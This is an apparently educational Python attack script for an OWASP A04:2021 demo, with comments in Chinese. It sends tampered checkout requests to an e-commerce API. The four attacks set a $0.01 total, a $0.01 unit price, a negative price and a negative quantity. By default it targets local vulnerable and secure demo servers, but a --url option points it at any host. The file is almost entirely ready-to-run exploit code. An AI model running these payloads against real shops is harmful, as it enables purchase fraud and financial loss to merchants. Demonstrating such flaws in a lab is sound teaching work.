#!/usr/bin/env python3
"""
OWASP A04:2021 - Price Manipulation Attack Script
==================================================
測試信任客戶端價格的漏洞

CWE-472: External Control of Assumed-Immutable Web Parameter
CWE-602: Client-Side Enforcement of Server-Side Security

Author: OWASP Demo
"""

import requests
import argparse
import json

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║  ██████╗ ██████╗ ██╗ ██████╗███████╗                                       ║
║  ██╔══██╗██╔══██╗██║██╔════╝██╔════╝                                       ║
║  ██████╔╝██████╔╝██║██║     █████╗                                         ║
║  ██╔═══╝ ██╔══██╗██║██║     ██╔══╝                                         ║
║  ██║     ██║  ██║██║╚██████╗███████╗                                       ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝ ╚═════╝╚══════╝                                       ║
║  ███╗   ███╗ █████╗ ███╗   ██╗██╗██████╗ ██╗   ██╗██╗      █████╗ ████████╗║
║  ████╗ ████║██╔══██╗████╗  ██║██║██╔══██╗██║   ██║██║     ██╔══██╗╚══██╔══╝║
║  ██╔████╔██║███████║██╔██╗ ██║██║██████╔╝██║   ██║██║     ███████║   ██║   ║
║  ██║╚██╔╝██║██╔══██║██║╚██╗██║██║██╔═══╝ ██║   ██║██║     ██╔══██║   ██║   ║
║  ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║██║     ╚██████╔╝███████╗██║  ██║   ██║   ║
║  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ║
║                                                                             ║
║  OWASP A04:2021 - Price Manipulation Attack Script                         ║
║  CWE-472/602: Client-Side Price Tampering                                   ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def get_product_info(base_url, product_id=1):
    """獲取產品資訊"""
    try:
        response = requests.get(f"{base_url}/api/products/{product_id}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {"id": product_id, "name": "Unknown Product", "price": 999.99}


def attack_total_amount_manipulation(base_url):
    """篡改訂單總金額"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Total Amount Manipulation - 總金額篡改{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/checkout")
    print(f"攻擊原理: 伺服器信任客戶端提供的 totalAmount 參數")
    
    product = get_product_info(base_url, 1)
    original_price = product.get("price", 999.99)
    quantity = 5
    original_total = original_price * quantity
    manipulated_total = 0.01  # 篡改為 $0.01
    
    print(f"\n[*] 產品資訊:")
    print(f"    產品: {product.get('name', 'Unknown')}")
    print(f"    單價: ${original_price}")
    print(f"    數量: {quantity}")
    print(f"    正常總價: ${original_total}")
    print(f"    篡改總價: ${manipulated_total}")
    
    # 發送篡改後的請求
    payload = {
        "items": [
            {
                "productId": product.get("id", 1),
                "quantity": quantity,
                "unitPrice": original_price  # 正常單價
            }
        ],
        "totalAmount": manipulated_total  # 篡改總金額
    }
    
    print(f"\n[*] 發送篡改請求:")
    print(f"    {json.dumps(payload, indent=4)}")
    
    try:
        response = requests.post(
            f"{base_url}/api/orders/checkout",
            json=payload,
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            final_total = data.get("totalAmount", 0)
            
            print(f"    訂單ID: {data.get('orderId', 'N/A')}")
            print(f"    最終金額: ${final_total}")
            
            if final_total <= 1:
                print(f"\n{RED}[VULNERABLE] 價格篡改成功！{RESET}")
                print(f"    原價 ${original_total} → 實付 ${final_total}")
                print(f"    節省: ${original_total - final_total}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 伺服器重新計算了價格{RESET}")
                return False
        else:
            error = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
            print(f"    錯誤: {error}")
            print(f"\n{GREEN}[PROTECTED] 請求被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_unit_price_manipulation(base_url):
    """篡改單價"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] Unit Price Manipulation - 單價篡改{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/checkout")
    print(f"攻擊原理: 伺服器信任客戶端提供的 unitPrice 參數")
    
    product = get_product_info(base_url, 1)
    original_price = product.get("price", 999.99)
    manipulated_price = 0.01  # 篡改為 $0.01
    quantity = 10
    
    print(f"\n[*] 產品資訊:")
    print(f"    產品: {product.get('name', 'Unknown')}")
    print(f"    原始單價: ${original_price}")
    print(f"    篡改單價: ${manipulated_price}")
    print(f"    數量: {quantity}")
    print(f"    正常總價: ${original_price * quantity}")
    print(f"    篡改總價: ${manipulated_price * quantity}")
    
    payload = {
        "items": [
            {
                "productId": product.get("id", 1),
                "quantity": quantity,
                "unitPrice": manipulated_price  # 篡改單價
            }
        ],
        "totalAmount": manipulated_price * quantity  # 根據篡改單價計算
    }
    
    print(f"\n[*] 發送篡改請求:")
    print(f"    {json.dumps(payload, indent=4)}")
    
    try:
        response = requests.post(
            f"{base_url}/api/orders/checkout",
            json=payload,
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            final_total = data.get("totalAmount", 0)
            
            print(f"    訂單ID: {data.get('orderId', 'N/A')}")
            print(f"    最終金額: ${final_total}")
            
            if final_total < original_price * quantity * 0.5:  # 如果價格低於正常的一半
                print(f"\n{RED}[VULNERABLE] 單價篡改成功！{RESET}")
                print(f"    原價 ${original_price * quantity} → 實付 ${final_total}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 伺服器使用資料庫中的正確價格{RESET}")
                return False
        else:
            error = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
            print(f"    錯誤: {error}")
            print(f"\n{GREEN}[PROTECTED] 請求被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_negative_price(base_url):
    """負數價格攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Negative Price Attack - 負數價格攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/checkout")
    print(f"攻擊原理: 使用負數價格產生信用/退款")
    
    payload = {
        "items": [
            {
                "productId": 1,
                "quantity": 1,
                "unitPrice": -100.00  # 負數價格
            }
        ],
        "totalAmount": -100.00
    }
    
    print(f"\n[*] 發送負數價格請求:")
    print(f"    {json.dumps(payload, indent=4)}")
    
    try:
        response = requests.post(
            f"{base_url}/api/orders/checkout",
            json=payload,
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            final_total = data.get("totalAmount", 0)
            
            if final_total < 0:
                print(f"\n{RED}[VULNERABLE] 負數價格被接受！可能產生退款/信用{RESET}")
                print(f"    金額: ${final_total}")
                return True
            else:
                print(f"\n{YELLOW}[PARTIAL] 訂單創建但價格被正規化{RESET}")
                return False
        else:
            print(f"\n{GREEN}[PROTECTED] 負數價格被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_zero_quantity_discount(base_url):
    """零數量折扣攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Zero/Negative Quantity Attack - 數量操縱攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/orders/checkout")
    print(f"攻擊原理: 使用負數數量產生折扣")
    
    product = get_product_info(base_url, 1)
    price = product.get("price", 999.99)
    
    payload = {
        "items": [
            {
                "productId": 1,
                "quantity": 5,  # 正數
                "unitPrice": price
            },
            {
                "productId": 2,
                "quantity": -3,  # 負數 - 嘗試減少總價
                "unitPrice": price
            }
        ],
        "totalAmount": price * 2  # 5 - 3 = 2 件
    }
    
    print(f"\n[*] 發送混合數量請求:")
    print(f"    {json.dumps(payload, indent=4)}")
    
    try:
        response = requests.post(
            f"{base_url}/api/orders/checkout",
            json=payload,
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            final_total = data.get("totalAmount", 0)
            
            if final_total < price * 5:  # 如果比正數項目總價低
                print(f"\n{RED}[VULNERABLE] 負數數量被接受，減少了總價！{RESET}")
                print(f"    最終金額: ${final_total}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 負數數量被忽略或拒絕{RESET}")
                return False
        else:
            print(f"\n{GREEN}[PROTECTED] 請求被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    tests = [
        ("總金額篡改", attack_total_amount_manipulation),
        ("單價篡改", attack_unit_price_manipulation),
        ("負數價格", attack_negative_price),
    ]
    
    results = {
        "漏洞版本": {},
        "安全版本": {}
    }
    
    for test_name, test_func in tests:
        print(f"\n\n{YELLOW}========== 測試: {test_name} =========={RESET}")
        
        print(f"\n{BLUE}--- 漏洞版本 ---{RESET}")
        vuln_result = test_func(VULNERABLE_URL)
        results["漏洞版本"][test_name] = vuln_result
        
        print(f"\n{BLUE}--- 安全版本 ---{RESET}")
        secure_result = test_func(SECURE_URL)
        results["安全版本"][test_name] = secure_result
    
    # 摘要
    print(f"\n\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}結果摘要{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n{'測試項目':<20} {'漏洞版本':<15} {'安全版本':<15}")
    print("-" * 50)
    
    for test_name, _ in tests:
        vuln_status = f"{RED}VULNERABLE{RESET}" if results["漏洞版本"].get(test_name) else f"{GREEN}OK{RESET}"
        secure_status = f"{RED}VULNERABLE{RESET}" if results["安全版本"].get(test_name) else f"{GREEN}PROTECTED{RESET}"
        print(f"{test_name:<20} {vuln_status:<25} {secure_status:<25}")


def main():
    parser = argparse.ArgumentParser(
        description="Price Manipulation Attack Script for OWASP A04 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 price_manipulation.py --total       # 總金額篡改
  python3 price_manipulation.py --unit        # 單價篡改
  python3 price_manipulation.py --negative    # 負數價格
  python3 price_manipulation.py --quantity    # 數量操縱
  python3 price_manipulation.py --all         # 所有攻擊
  python3 price_manipulation.py --compare     # 比較版本
        """
    )
    
    parser.add_argument("--total", action="store_true", help="總金額篡改")
    parser.add_argument("--unit", action="store_true", help="單價篡改")
    parser.add_argument("--negative", action="store_true", help="負數價格")
    parser.add_argument("--quantity", action="store_true", help="數量操縱")
    parser.add_argument("--all", action="store_true", help="所有攻擊")
    parser.add_argument("--compare", action="store_true", help="比較版本")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.compare:
        compare_vulnerability()
    elif args.all:
        attack_total_amount_manipulation(args.url)
        attack_unit_price_manipulation(args.url)
        attack_negative_price(args.url)
        attack_zero_quantity_discount(args.url)
    else:
        if args.total:
            attack_total_amount_manipulation(args.url)
        if args.unit:
            attack_unit_price_manipulation(args.url)
        if args.negative:
            attack_negative_price(args.url)
        if args.quantity:
            attack_zero_quantity_discount(args.url)
        
        if not any([args.total, args.unit, args.negative, args.quantity]):
            attack_total_amount_manipulation(args.url)
    
    print(f"\n{BLUE}[*] Price Manipulation 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
